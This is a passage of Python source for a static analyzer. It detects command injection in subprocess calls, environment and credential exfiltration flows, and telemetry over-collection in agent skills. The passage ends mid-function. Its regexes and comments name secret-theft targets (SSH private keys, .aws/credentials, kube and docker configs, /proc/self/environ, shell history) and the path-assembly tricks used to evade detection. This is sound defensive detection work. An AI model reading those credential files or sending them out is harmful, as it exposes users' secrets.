    """For a subprocess.* call with tainted input, is it command-injection grade?

    True  -> shell=True (or a non-literal shell value), OR a non-list first arg
             (string command / tainted program path) that layer 2 cannot clear, OR
             the program element argv[0] is itself tainted.
    False -> argv-list form with shell not True and a fixed (untainted) program — the
             tainted value is only a non-program argument. That is argument injection
             (low risk: metacharacters are literal argv data passed to execve), NOT
             command injection. Regression guard for the B13 false-positive class.
             ALSO False (B-413 layer 2) when `first` is the wrapper's OWN bare
             parameter Name and EVERY intra-file call site to the wrapper binds that
             parameter to a fully-literal, untainted-program argv list -- the
             ordinary `def run(cmd): subprocess.check_call(cmd, ...)` idiom, where
             `cmd` is genuinely tainted from `run`'s own perspective (layer 1 is
             correct about that) but every real invocation is hardcoded.

    The argv list may be inline (`run([prog, arg])`) or bound to a local resolved via
    ``list_bindings`` (`cmd = [prog, arg]; run(cmd)`) — the dominant real-world form.

    The keyword-only `tree`/`owner_map`/`parent_scope`/`shadow_cache`/`ext_taint_map`/
    `list_bindings_by_call` args are layer 2's extra context; all optional (default
    None) so this stays callable exactly as before layer 2 existed. Layer 2 is only
    attempted when every one of them is supplied.

    `func_param_taint`/`layer2_cache` (B-863) are layer 2's OWN further extra
    context, needed only when the wrapper's body itself reassigns or mutates
    `first`'s bare parameter (see `_b863_tier1_tier2_verdict`); when either is
    omitted, that step is skipped and the ORIGINAL, pre-B-863 call-site-only
    check (`_all_call_sites_bind_fixed_argv`) decides alone, unchanged.

    B-906: `ref_res`, optional, adds `ref_res.source_in(elt)` alongside each
    `_names_in(elt) & tainted` check in the inline-list branch below (and is passed
    through to layer 2's own `_all_call_sites_bind_fixed_argv`) -- NEVER the
    spelling vocabulary (`_value_is_tainted_source`/`_rhs_has_subscript_environ`);
    see `_RefResolver`'s module note for why that vocabulary must stay out of this
    inline position. Purely additive: each check can only flip False->True (crit),
    never the reverse.
    """
    for kw in node.keywords:
        if kw.arg == "shell":
            v = kw.value
            if isinstance(v, ast.Constant) and v.value is False:
                break  # explicit shell=False -> fall through to the argv-form check
            return True  # shell=True, or a dynamic value we cannot prove is False
    first = node.args[0] if node.args else None
    # B-655 (gap 1c): `check_output(list(args))` -- the sink's first argument is an
    # ast.Call, not a Name, so neither the literal-List/Tuple branch below nor the
    # bare-Name/layer-2 branch was ever reached, independently of whether `args` is
    # the wrapper's own vararg. Unwrap the narrowest possible shape -- a single
    # positional argument, no keywords, no starred unpacking, to the builtin name
    # `list`/`tuple` -- to the Name it wraps, so it can flow into the SAME
    # resolution paths a bare `check_output(args)` already gets.
    #
    # C-135: this unwrap trusts that `list`/`tuple` still means the builtin. A file
    # that SHADOWS the name (`def list(x): return ["sh", "-c", tainted]`) could make
    # the unwrap "resolve" to a Name that is not actually what gets called at
    # runtime -- reproduced: without a shadow check, that shape silently cleared a
    # command built entirely by the attacker-controlled shadow, for the ordinary
    # non-vararg wrapper idiom as well as the new vararg one. Only unwrap when
    # `tree` is available (needed to check) AND the name is not rebound anywhere in
    # the file -- whole-file, NOT scope-precise, same conservative-only philosophy
    # as `_param_argv_call_sites`'s own name-reference walk: a rebinding this cannot
    # actually reach from this call site still refuses the unwrap, which only ever
    # makes the result MORE conservative, never less.
    if (
        isinstance(first, ast.Call)
        and isinstance(first.func, ast.Name)
        and first.func.id in ("list", "tuple")
        and len(first.args) == 1
        and not first.keywords
        and isinstance(first.args[0], ast.Name)
        and tree is not None
        and not _name_rebound_anywhere(tree, first.func.id)
    ):
        first = first.args[0]
    if isinstance(first, ast.Name) and list_bindings:
        first = list_bindings.get(first.id, first)  # resolve a var-bound command list
    if isinstance(first, (ast.List, ast.Tuple)):
        prog = first.elts[0] if first.elts else None
        if prog is not None and (
            (_names_in(prog) & tainted) or (ref_res is not None and ref_res.source_in(prog))
        ):
            return True  # tainted program name -> arbitrary program execution
        # C-135 (B-413 round 1): argv[0] being untainted is not enough when argv[0]
        # is ITSELF a shell/indirect-execution interpreter -- the rest of the argv
        # list is text that interpreter parses and runs, not inert execve data (see
        # _argv0_is_shell_indirect_exec's docstring, layer 2's identical check below).
        if _argv0_is_shell_indirect_exec(first.elts):
            rest_names = set()
            for elt in first.elts[1:]:
                rest_names |= _names_in(elt)
            if (rest_names & tainted) or (
                ref_res is not None and any(ref_res.source_in(e) for e in first.elts[1:])
            ):
                return True  # tainted arg handed to a shell/interpreter -> command injection
        return False  # only a non-program argv element is tainted -> argument injection

    # B-413 layer 2: `first` is a bare, unresolved Name -- possibly the wrapper's OWN
    # parameter, which is genuinely tainted at THIS scope (layer 1 is correct about
    # that) but may still be safe if EVERY intra-file call site binds it to a
    # fully-literal argv list with an untainted program name.
    if (
        isinstance(first, ast.Name)
        and tree is not None
        and owner_map is not None
        and parent_scope is not None
        and shadow_cache is not None
        and ext_taint_map is not None
        and list_bindings_by_call is not None
    ):
        fn = owner_map.get(node)
        # B-655 (gap 1a): the vararg name (`*args`) was excluded from this gate, so
        # layer 2 never even attempted to run for `def sh(*args): check_output(args)`
        # -- `_param_argv_call_sites` now resolves the vararg case too (see its own
        # docstring), so it must be allowed to try.
        is_named_param = isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)) and (
            any(a.arg == first.id
                for a in (*fn.args.posonlyargs, *fn.args.args, *fn.args.kwonlyargs))
            or (fn.args.vararg is not None and fn.args.vararg.arg == first.id)
        )
        if is_named_param:
            call_sites = _param_argv_call_sites(fn, first.id, tree, owner_map)
            if call_sites is not None:
                # B-863: `_all_call_sites_bind_fixed_argv` alone only proves the
                # CALL SITE's own argv is fixed -- it says nothing about a wrapper
                # whose OWN body reassigns or mutates the parameter before the sink
                # (see `_b863_tier1_tier2_verdict`'s module comment for the history
                # of why a call-site-only check is unsound there). Try the B-863
                # verdict first; it returns None (behaviourally "no body channel at
                # all") when the parameter is never touched in the body, in which
                # case this falls through to the ORIGINAL, unchanged check below.
                b863_verdict = None
                if func_param_taint is not None:
                    b863_verdict = _b863_tier1_tier2_verdict(
                        node, fn, first.id, call_sites, tree, owner_map, parent_scope,
                        shadow_cache, ext_taint_map, func_param_taint, layer2_cache,
                    )
                if b863_verdict is not None:
                    return b863_verdict
                if _all_call_sites_bind_fixed_argv(
                    call_sites,
                    list_bindings_by_call,
                    owner_map,
                    ext_taint_map,
                    parent_scope,
                    shadow_cache,
                    ref_res=ref_res,
                ):
                    return False  # every real call site is a hardcoded command
    return True  # string / name / concat first arg -> string command or program path


def _subprocess_call_is_fixed_argv(
    node: ast.Call, list_bindings: dict[str, ast.List | ast.Tuple] | None = None
) -> bool:
    """B-132: True when a subprocess.* call's command is a literal argv LIST (inline or a
    var bound to exactly one list/tuple literal — see _single_list_bindings_local) and
    shell is not True. This is a pure SHAPE check, independent of taint: a fixed argv list
    passes its elements to execve as literal argv data, not through a shell, so it cannot
    be split/re-interpreted the way a concatenated/interpolated command STRING can — much
    lower risk regardless of whether any element happens to be attacker-influenced.
    Mirrors _subprocess_taint_is_command_injection's list-resolution but without requiring
    a taint set, so it can gate the untainted DANGEROUS_SINK info-sink classification too.
    """
    for kw in node.keywords:
        if kw.arg == "shell":
            v = kw.value
            if not (isinstance(v, ast.Constant) and v.value is False):
                return False  # shell=True, or a dynamic value we cannot prove is False
    first = node.args[0] if node.args else None
    if isinstance(first, ast.Name) and list_bindings:
        first = list_bindings.get(first.id, first)  # resolve a var-bound command list
    return isinstance(first, (ast.List, ast.Tuple))


def _file_read_tainted_names(tree: ast.AST) -> set[str]:
    """Names whose value derives from a file-read operation (for TT4 source)."""
    tainted: set[str] = set()
    assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]
    for _ in range(4):
        changed = False
        for a in assigns:
            if _names_in(a.value) & tainted or _is_file_read_value(a.value, tainted):
                for t in a.targets:
                    if isinstance(t, ast.Name) and t.id not in tainted:
                        tainted.add(t.id)
                        changed = True
        if not changed:
            break
    return tainted


def _is_file_read_value(node: ast.AST, tainted: set[str]) -> bool:
    """True if *node* is a file-read expression or references a file-read tainted name."""
    if isinstance(node, ast.Name) and node.id in tainted:
        return True
    if isinstance(node, ast.Call):
        f = node.func
        if isinstance(f, ast.Attribute) and f.attr in _FILE_READ_METHOD_ATTRS:
            return True
        for child in ast.iter_child_nodes(node):
            if _is_file_read_value(child, tainted):
                return True
    return False


def _file_tainted(source: str, tree: ast.AST) -> set[str]:
    """Pre-filtered file-read taint: only run when the source has an open()/read_text() call."""
    if "open(" not in source and "read_text" not in source and "read_bytes" not in source:
        return set()
    return _file_read_tainted_names(tree)


def _is_env_read_value(node: ast.AST) -> bool:
    """True if *node* is a direct env-var read call (os.getenv, os.environ.get, os.environ[...]).

    Does NOT include file reads, network reads, or any other external source — env-var
    reads only, so the taint set stays tightly scoped to the ENV_EXFIL_FLOW rule.
    """
    if isinstance(node, ast.Call):
        f = node.func
        # os.getenv("X")
        if isinstance(f, ast.Attribute) and f.attr == "getenv" and _attr_base(f.value) == "os":
            return True
        # os.environ.get("X") — func is Attribute(value=Attribute(value=Name("os"), attr="environ"), attr="get")
        if isinstance(f, ast.Attribute) and f.attr == "get":
            base = f.value
            if (
                isinstance(base, ast.Attribute)
                and base.attr == "environ"
                and _attr_base(base.value) == "os"
            ):
                return True
            # environ.get("X") when environ was imported directly
            if isinstance(base, ast.Name) and base.id == "environ":
                return True
    return False


def _env_tainted_names(tree: ast.AST) -> set[str]:
    """Names whose value derives from an env-var read (transitively).

    Sources: os.getenv(), os.environ.get(), os.environ[...] subscript, environ[...].
    Propagation: simple assignment fixpoint (up to 4 iterations).
    """
    tainted: set[str] = set()
    assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]
    for _ in range(4):
        changed = False
        for a in assigns:
            rhs = a.value
            sourced = (
                _is_env_read_value(rhs)
                or _rhs_has_subscript_environ(rhs)
                or bool(_names_in(rhs) & tainted)
            )
            if not sourced:
                # Walk into f-strings and BinOp so  url + os.getenv("KEY") also taints url+key
                for sub in ast.walk(rhs):
                    if sub is rhs:
                        continue
                    if _is_env_read_value(sub) or _rhs_has_subscript_environ(sub):
                        sourced = True
                        break
            if sourced:
                for t in a.targets:
                    if isinstance(t, ast.Name) and t.id not in tainted:
                        tainted.add(t.id)
                        changed = True
                    elif isinstance(t, (ast.Tuple, ast.List)):
                        for elt in t.elts:
                            if isinstance(elt, ast.Name) and elt.id not in tainted:
                                tainted.add(elt.id)
                                changed = True
        if not changed:
            break
    return tainted


def _is_host_info_call(node: ast.AST) -> bool:
    """socket.gethostname() / platform.node() / platform.uname() / os.uname() -- a
    call that returns the host's own machine/OS identity."""
    if not isinstance(node, ast.Call):
        return False
    f = node.func
    return (
        isinstance(f, ast.Attribute)
        and f.attr in _HOST_INFO_ATTRS
        and _attr_base(f.value) in _HOST_INFO_BASES
    )


def _is_git_remote_read(node: ast.AST) -> bool:
    """os.popen('git remote -v').read() / subprocess.check_output(['git','remote','-v'])
    -- reading the repo's own git remote as a host/repo-identity source (C-203's
    case_01942 shape)."""
    if not isinstance(node, ast.Call):
        return False
    for n in ast.walk(node):
        if isinstance(n, ast.Constant) and isinstance(n.value, str) and _GIT_REMOTE_RE.search(n.value):
            return True
        if isinstance(n, (ast.List, ast.Tuple)):
            parts = [
                e.value for e in n.elts if isinstance(e, ast.Constant) and isinstance(e.value, str)
            ]
            if "git" in parts and "remote" in parts:
                return True
    return False


def _host_info_tainted_names(tree: ast.AST) -> set[str]:
    """Names whose value derives from a host-identity read (transitively) -- same
    assignment-fixpoint shape as _env_tainted_names, sourced from host-info calls and
    git-remote reads instead of env vars."""
    tainted: set[str] = set()
    assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]
    for _ in range(4):
        changed = False
        for a in assigns:
            rhs = a.value
            sourced = bool(_names_in(rhs) & tainted) or any(
                _is_host_info_call(n) or _is_git_remote_read(n) for n in ast.walk(rhs)
            )
            if sourced:
                for t in a.targets:
                    if isinstance(t, ast.Name) and t.id not in tainted:
                        tainted.add(t.id)
                        changed = True
        if not changed:
            break
    return tainted


# ---- B-342 (T09/SkillTrustBench V_EXCESSIVE_TELEMETRY) helpers ------------------


def _is_bulk_environ_call(node: ast.AST) -> bool:
    """True for a BULK read of the whole environment -- os.environ.items()/.keys()/
    .values()/.copy(), dict(os.environ), sorted(os.environ)/list(os.environ) -- as
    opposed to a single named lookup (os.getenv("X") / os.environ.get("X")), which is
    the ordinary, non-invasive way a skill reads its own config and is deliberately
    NOT matched here (that shape is ENV_EXFIL_FLOW's territory, not this rule's)."""
    if not isinstance(node, ast.Call):
        return False
    f = node.func

    def _is_environ_obj(n: ast.AST) -> bool:
        if isinstance(n, ast.Attribute) and n.attr == "environ" and _attr_base(n.value) == "os":
            return True
        return isinstance(n, ast.Name) and n.id == "environ"

    if isinstance(f, ast.Attribute) and f.attr in ("items", "keys", "values", "copy"):
        return _is_environ_obj(f.value)
    if isinstance(f, ast.Name) and f.id in ("dict", "sorted", "list"):
        return bool(node.args) and _is_environ_obj(node.args[0])
    return False


def _is_bulk_fs_walk_call(node: ast.AST) -> bool:
    """True for a recursive/bulk filesystem enumeration: os.walk(...), <expr>.rglob(...),
    or glob.glob(..., recursive=True)."""
    if not isinstance(node, ast.Call):
        return False
    f = node.func
    if not isinstance(f, ast.Attribute):
        return False
    if f.attr == "walk" and _attr_base(f.value) == "os":
        return True
    if f.attr == "rglob":
        return True
    if f.attr == "glob" and _attr_base(f.value) == "glob":
        return any(
            kw.arg == "recursive"
            and isinstance(kw.value, ast.Constant)
            and kw.value.value is True
            for kw in node.keywords
        )
    return False


def _is_bulk_dir_listing_call(node: ast.AST) -> bool:
    """True for os.listdir(...) / <expr>.iterdir() -- a bulk directory-contents read,
    as opposed to checking/opening one named file."""
    if not isinstance(node, ast.Call):
        return False
    f = node.func
    if not isinstance(f, ast.Attribute):
        return False
    if f.attr == "listdir" and _attr_base(f.value) == "os":
        return True
    return f.attr == "iterdir"


def _function_has_history_file_read(fn: ast.AST) -> bool:
    """True when *fn*'s body both names a shell/command-history file (.bash_history,
    .zsh_history, .python_history, ...) as a string constant AND contains a file-read
    call -- a same-function co-occurrence check (not a precise path-to-read dataflow
    connection), matching this rule's per-function-not-per-call precision level."""
    has_literal = any(
        isinstance(n, ast.Constant)
        and isinstance(n.value, str)
        and _HISTORY_FILENAME_RE.search(n.value)
        for n in ast.walk(fn)
    )
    if not has_literal:
        return False
    return any(
        (isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute) and n.func.attr in _FILE_READ_METHOD_ATTRS)
        or (isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id in _FILE_OPEN_NAMES)
        for n in ast.walk(fn)
    )


def _telemetry_overcollection_categories(fn: ast.AST) -> set[str]:
    """The distinct over-collection axes (env/fswalk/dirlist/history) directly present
    anywhere in *fn*'s body."""
    cats: set[str] = set()
    for n in ast.walk(fn):
        if _is_bulk_environ_call(n):
            cats.add("env")
        elif _is_bulk_fs_walk_call(n):
            cats.add("fswalk")
        elif _is_bulk_dir_listing_call(n):
            cats.add("dirlist")
    if _function_has_history_file_read(fn):
        cats.add("history")
    return cats


def _telemetry_collector_funcnames(tree: ast.AST) -> set[str]:
    """Top-level function/method names whose OWN body combines >=2 distinct
    over-collection axes -- see the EXCESSIVE_TELEMETRY_FLOW comment above for why
    two axes, not one, is the bar."""
    names: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            if len(_telemetry_overcollection_categories(node)) >= 2:
                names.add(node.name)
    return names


def _telemetry_tainted_names(tree: ast.AST, collector_funcs: set[str]) -> set[str]:
    """Names whose value derives (transitively, name-based) from calling one of
    *collector_funcs* -- same assignment-fixpoint shape as _host_info_tainted_names,
    sourced from a call to a known over-collection function instead of a single
    built-in call.

    Also seeds taint at CALL SITES, not just assignments: ``send(collect())`` passes
    the collector's return value directly as an argument, with no intermediate
    variable for the assignment scan above to ever see. Every corpus sample this rule
    targets uses the two-function collect/send split, and both the assign-then-call
    form (``data = collect(); send(data)``) and this direct-nested-call form appear in
    practice, so missing the second halves real recall. When a user-defined function
    is called with a sourced argument, ALL of its parameter names are tainted together
    (not matched positionally/by keyword) -- the same name-based, whole-file
    approximation already used above, not a scope-precise binding."""
    if not collector_funcs:
        return set()
    tainted: set[str] = set()
    assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]
    calls = [n for n in ast.walk(tree) if isinstance(n, ast.Call) and isinstance(n.func, ast.Name)]
    param_names: dict[str, set[str]] = {}
    for fn in ast.walk(tree):
        if isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
            names = {a.arg for a in fn.args.args} | {a.arg for a in fn.args.kwonlyargs}
            if fn.args.vararg:
                names.add(fn.args.vararg.arg)
            if fn.args.kwarg:
                names.add(fn.args.kwarg.arg)
            param_names.setdefault(fn.name, set()).update(names)

    def _is_sourced(subtree: ast.AST) -> bool:
        return bool(_names_in(subtree) & tainted) or any(
            isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id in collector_funcs
            for n in ast.walk(subtree)
        )

    for _ in range(4):
        changed = False
        for a in assigns:
            if _is_sourced(a.value):
                for t in a.targets:
                    if isinstance(t, ast.Name) and t.id not in tainted:
                        tainted.add(t.id)
                        changed = True
                    elif (
                        isinstance(t, ast.Subscript)
                        and isinstance(t.value, ast.Name)
                        and t.value.id not in tainted
                    ):
                        tainted.add(t.value.id)
                        changed = True
        for c in calls:
            params = param_names.get(c.func.id)
            if not params or params <= tainted:
                continue
            arg_nodes = [*c.args, *(kw.value for kw in c.keywords)]
            if any(_is_sourced(arg) for arg in arg_nodes):
                newly = params - tainted
                if newly:
                    tainted |= newly
                    changed = True
        if not changed:
            break
    return tainted


def _has_agent_config_path_const(node: ast.AST) -> bool:
    """True if the subtree contains a string constant naming an agent config file path."""
    for n in ast.walk(node):
        if (
            isinstance(n, ast.Constant)
            and isinstance(n.value, str)
            and _AGENT_CONFIG_PATH_RE.search(n.value)
        ):
            return True
    return False


def _agent_config_file_tainted_names(source: str, tree: ast.AST) -> set[str]:
    """Names whose value derives from reading an agent-config file (transitively).

    Like _file_read_tainted_names but restricted to file-reads whose path argument
    contains an agent-config path literal (.openclaw/, ~/.config/<agent>/).
    Returns an empty set when no agent-config path appears in the source (fast path).
    """
    if not _AGENT_CONFIG_PATH_RE.search(source):
        return set()
    tainted: set[str] = set()
    assigns = [n for n in ast.walk(tree) if isinstance(n, ast.Assign)]
    for _ in range(4):
        changed = False
        for a in assigns:
            rhs = a.value
            sourced = bool(_names_in(rhs) & tainted) or _is_agent_config_read_value(rhs, tainted)
            if sourced:
                for t in a.targets:
                    if isinstance(t, ast.Name) and t.id not in tainted:
                        tainted.add(t.id)
                        changed = True
        if not changed:
            break
    return tainted


def _is_agent_config_read_value(node: ast.AST, tainted: set[str]) -> bool:
    """True if *node* is a file-read on a path that is an agent-config path literal,
    or references a name already tainted by such a read."""
    if isinstance(node, ast.Name) and node.id in tainted:
        return True
    if isinstance(node, ast.Call):
        f = node.func
        # .read() / .read_text() / .readlines() / .read_bytes() on an open() call
        # whose path argument is an agent-config path literal.
        if isinstance(f, ast.Attribute) and f.attr in _FILE_READ_METHOD_ATTRS:
            # The object being called on may be an open(path) call.
            if _is_agent_config_open_call(f.value):
                return True
            # Or a tainted name (propagation).
            if isinstance(f.value, ast.Name) and f.value.id in tainted:
                return True
        # open(path) or Path(path).read_text() etc — check if path has agent-config literal.
        if isinstance(f, ast.Name) and f.id in _FILE_OPEN_NAMES:
            if node.args and _has_agent_config_path_const(node.args[0]):
                return True
        # Recurse for chained calls.
        for child in ast.iter_child_nodes(node):
            if _is_agent_config_read_value(child, tainted):
                return True
    return False


def _is_agent_config_open_call(node: ast.AST) -> bool:
    """True if *node* is an open(path) call where path is an agent-config path literal."""
    if not isinstance(node, ast.Call):
        return False
    f = node.func
    if isinstance(f, ast.Name) and f.id in _FILE_OPEN_NAMES:
        return bool(node.args and _has_agent_config_path_const(node.args[0]))
    return False


# ===================== B-830: root-independent credential-path folding =====================
# Three gates close the "assemble the path, don't spell it" bypass of _CRED_PATH_RE's
# literal scan (`Path.home().joinpath('.aws', 'credentials')`, `os.path.join(os.path.
# expanduser('~'), '.aws', 'credentials')`, ...), without turning every path-join call
# into a credential finding:
#
#   Gate V (_FOLDED_CRED_PATH_RE) -- a CLOSED set of exactly 6 root-independent
#   credential-FILENAME patterns a fold may assert on its own: it is a proper subset of
#   _CRED_PATH_RE (which stays unchanged below, for the direct/literal scan) and
#   deliberately excludes the generic "secrets?" pattern and any single-token filename.
#   Folding a bare "secrets" segment onto an opaque, caller-controlled root would convict
#   a legitimate secrets-manager client for doing exactly what it should
#   (os.path.join(mount_point, "secrets", app_name)) -- that shape must stay clean.
#
#   Gate S (_FsFoldCtx.is_* / is_typed_path_join) -- what counts as a path-join "by
#   construction": pathlib's `/` operator and constructors (TYPED -- bound by an import,
#   like _path_module_aliases already requires for os.path.join elsewhere in this
#   module), `.joinpath(...)` on ANY receiver (the method name alone is the signal),
#   typed os.path.join/posixpath.join/ntpath.join, "/".join([...])/os.sep.join(...), and
#   a narrow Tier B fallback: an untyped/unverified bare `join(...)` or `x.join(...)`
#   called with 2+ positional args and no keywords. str.join takes exactly one
#   (iterable) argument, so a 2+-arg call spelled `join` cannot be a string join --
#   Tier B exists so a trivial aliasing trick (`os = os`, `op = os.path`,
#   `self.h.joinpath(...)`) that defeats the TYPED check still doesn't defeat detection
#   outright; it only forces the fold's root to stay opaque (no re-rooting trust).
#
#   Gate A (_fold_fs_path) -- the value-folding algebra itself: known string segments
#   fold exactly; any segment that can't be determined folds to the sentinel _FOLD_UNK,
#   which never appears in any Gate-V alternative, so it can only ever WIDEN a fold's
#   candidate span, never complete a credential-filename match by itself. A bare Name
#   folds through its bound value only when it is bound EXACTLY ONCE in the whole file
#   via a single-target Assign/AnnAssign (depth-capped, cycle-guarded) -- otherwise it's
#   unknown. `.expanduser()`/`.absolute()`/`.resolve()` and a suffix-preserving `str()`/
#   `os.fspath()` pass their argument/receiver through unchanged.
_FOLDED_CRED_PATH_RE = re.compile(
    r"\.ssh/id_[a-z0-9_]+(?![a-z0-9_]|\.pub\b|-cert\.pub\b)"  # private keys only, never .pub/-cert.pub
    r"|\.aws/credentials"
    # `config.json` (not just `.docker/config`, the way _CRED_PATH_RE's laxer substring
    # scan reads below): the Docker CLI's real credentials file is ~/.docker/config.json
    # -- "config" with no extension isn't a file Docker ever writes there, so requiring
    # the exact real filename keeps this closed, fold-only set precise, the same
    # precision principle as the id_*/.pub exclusion above. _CRED_PATH_RE's broader
    # prefix stays fine for the literal/direct scan, where a substring match against raw
    # source text already needs the real ".json" text to be present somewhere nearby to
    # read as this path at all.
    r"|\.docker/config\.json"
    r"|\.kube/config"
    # B-830 round-2 (C-135): a right-hand lookahead, not just a bare prefix -- without
    # it this over-matched a directory-name collision like a benign
    # `.config/gcloud-helper/prefs` (an unrelated tool's config dir that merely starts
    # with "gcloud"), which is not the real gcloud credentials directory at all. Folded
    # segments are always joined with "/", so requiring a "/" continuation or end-of-
    # string right after "gcloud" is sufficient to exclude "gcloud-helper" while still
    # matching the real ".config/gcloud/legacy_credentials/..." shape.
    r"|\.config/gcloud(?=/|$)"
    r"|/proc/(?:self|\d+)/environ",
    re.I,
)
_FOLD_UNK = "\x00"  # an unresolved path segment; never a substring of any pattern above
# B-830 round-3 (C-135): the fold's own recursion has no depth limit of its own, so a
# long left-deep chain -- `/`-chained BinOps, chained `.joinpath(...)` calls, or a chain
# of single-use name-hops -- can overflow the interpreter's recursion limit well before
# anything else in this module would. An explicit, threaded depth counter (not a
# try/except RecursionError around the caller) bounds this: once a fold's own depth
# exceeds this cap, it returns `None` (this algebra's existing "unresolved" value,
# which callers already widen to _FOLD_UNK) instead of recursing further. 200 mirrors
# CPython's own parser bracket-nesting limit, so a right-nested construct can't hide a
# credential-bearing tail deeper than that. Returning "unknown" only ever WIDENS what a
# fold treats as unresolved -- it can never manufacture a spurious credential-path
# match -- and because these chains are left-deep (a chain's most-recently-appended
# segment sits at the AST's OUTERMOST/shallowest node, with earlier segments nested
# progressively deeper), truncating the deep prefix only discards padding, never the
# tail that a real bypass needs recognized. See the call sites below for why the
# three former `except RecursionError:` fallbacks (silent, undisclosed, whole-file
# credential-detection bypasses) are gone now that overflow can't happen here.
_FOLD_MAX_DEPTH = 200
# B-830 round-6 (C-135 follow-up review of round-5's fix, with a performance
# measurement this time): a private sentinel distinguishing "this key's fold is
# currently being computed, on this same call stack" (the cycle guard) from a real
# cached `(result, budget)` pair -- see `_fold_fs_path`'s docstring for why a plain
# `None` can no longer double as the cycle-guard value.
_FOLD_IN_PROGRESS = object()
_PATHLIB_CLASSES = frozenset(
    {"Path", "PurePath", "PosixPath", "PurePosixPath", "WindowsPath", "PureWindowsPath"}
)
_PATH_JOIN_MODULES = frozenset({"os.path", "posixpath", "ntpath"})


def _binding_site_counts(tree: ast.AST) -> "tuple[dict, dict]":
    """`(counts, simple)` for *tree*: how many times each name is BOUND anywhere (any
    binding form -- assignment, parameter, def/class, import, except-as, global/
    nonlocal, match-capture), and the RHS of every simple single-name Assign/AnnAssign
    target (last write wins per name in this dict; the caller keeps only the subset
    whose `counts` is exactly 1, so a name assigned more than once is never treated as
    resolvable through this map)."""
    counts: dict = {}
    simple: dict = {}

    def bump(name: str) -> None:
        counts[name] = counts.get(name, 0) + 1

    for n in ast.walk(tree):
        if isinstance(n, ast.Name) and isinstance(n.ctx, (ast.Store, ast.Del)):
            bump(n.id)
        elif isinstance(n, ast.arg):
            bump(n.arg)
        elif isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
            bump(n.name)
        elif isinstance(n, (ast.Import, ast.ImportFrom)):
            for a in n.names:
                if a.name != "*":
                    bump(a.asname or a.name.split(".")[0])
        elif isinstance(n, ast.ExceptHandler) and n.name:
            bump(n.name)
        elif isinstance(n, (ast.Global, ast.Nonlocal)):
            for nm in n.names:
                # A global/nonlocal name's real value lives outside this scope, so it
                # must never be treated as a resolvable single-site binding even if
                # this is its only local occurrence -- force the count above 1.
                counts[nm] = counts.get(nm, 0) + 2
        elif _MATCH_BIND_NODES and isinstance(n, _MATCH_BIND_NODES) and n.name:
            bump(n.name)
        if isinstance(n, ast.Assign):
            for t in n.targets:
                if isinstance(t, ast.Name):
                    simple[t.id] = n.value
        elif isinstance(n, ast.AnnAssign) and isinstance(n.target, ast.Name) and n.value is not None:
            simple[n.target.id] = n.value
    return counts, simple


class _FsFoldCtx:
    """Per-file context for `_fold_fs_path`, built once per tree and threaded through
    every fold call: which names are bound to a path module / pathlib class / typed
    join function, and which simple single-assignment names may be resolved by value."""

    def __init__(self, tree: ast.AST):
        self.path_aliases = _path_module_aliases(tree)
        counts, simple = _binding_site_counts(tree)
        self.single = {k: v for k, v in simple.items() if counts.get(k, 0) == 1}
        # Every name bound ANYWHERE in the file, by any binding form. File-wide, not
        # scope-aware (matches `ctx.single`'s own fail-safe granularity) -- a shadow
        # anywhere in the file only ever makes a fold MORE conservative, never less.
        self.shadowed = set(counts)

        join_funcs, expanduser_funcs, ctor_names, pathlib_mods = set(), set(), set(), set()
        for n in ast.walk(tree):
            if isinstance(n, ast.ImportFrom) and n.module in _PATH_JOIN_MODULES:
                for a in n.names:
                    if a.name == "join":
                        join_funcs.add(a.asname or a.name)
                    elif a.name == "expanduser":
                        expanduser_funcs.add(a.asname or a.name)
            elif isinstance(n, ast.ImportFrom) and n.module == "pathlib":
                for a in n.names:
                    if a.name in _PATHLIB_CLASSES:
                        ctor_names.add(a.asname or a.name)
            elif isinstance(n, ast.Import):
                for a in n.names:
                    if a.name == "pathlib":
                        pathlib_mods.add(a.asname or "pathlib")

        # A name earns membership only by being bound EXACTLY ONCE, by its qualifying
        # import -- a name bound any other way too (fail-safe direction) is untyped.
        def import_bound(names: set) -> set:
            return {nm for nm in names if counts.get(nm, 0) == 1}

        self.join_funcs = import_bound(join_funcs)
        self.expanduser_funcs = import_bound(expanduser_funcs)
        self.ctor_names = import_bound(ctor_names)
        self.pathlib_mods = import_bound(pathlib_mods)
        self.memo: dict = {}
        # B-830 round-3: how many times a fold call hit _FOLD_MAX_DEPTH and gave up
        # (observability only -- never consulted for a verdict; see _fold_fs_path).
        self.truncated = 0
        # B-830 round-7: how many times a fold call REUSED a cache entry that was
        # itself computed under a truncated (non-None) budget. Deliberately separate
        # from `self.truncated` -- that counter feeds the disclosed AST_FOLD_TRUNCATED
        # count and must stay an exact count of genuine depth-cap truncations, not of
        # cache-reuse events. See `_fold_fs_path`'s docstring for why both counters
        # must be consulted together when deciding whether a result is cacheable as
        # budget=None ("exact").
        self.inexact = 0

    def is_suffix_preserving(self, call: ast.Call) -> bool:
        """True for a single-argument wrapper that changes at most a leading '~'
        (expanduser) or the outer type (str()/os.fspath()), never the literal tail --
        so folding may recurse straight into its one argument."""
        f = call.func
        if isinstance(f, ast.Name):
            if f.id in self.expanduser_funcs:
                return True
            # Bare str(...) is trusted as an identity wrapper only when `str` is never
            # rebound anywhere in the file (as a parameter, import, assignment, ...).
            return f.id == "str" and f.id not in self.shadowed
        if isinstance(f, ast.Attribute) and f.attr in ("expanduser", "fspath"):
            b = f.value
            direct, viaos = self.path_aliases
            if f.attr == "expanduser":
                if isinstance(b, ast.Name) and b.id in direct:
                    return True
                return (
                    isinstance(b, ast.Attribute)
                    and b.attr == "path"
                    and isinstance(b.value, ast.Name)
                    and b.value.id in viaos
                )
            return isinstance(b, ast.Name) and b.id in viaos  # os.fspath(...)
        return False

    def is_pathlib_ctor(self, f: ast.AST, visiting: frozenset = frozenset()) -> bool:
        if isinstance(f, ast.Name):
            if f.id in self.ctor_names:
                return True
            rhs = self.single.get(f.id)
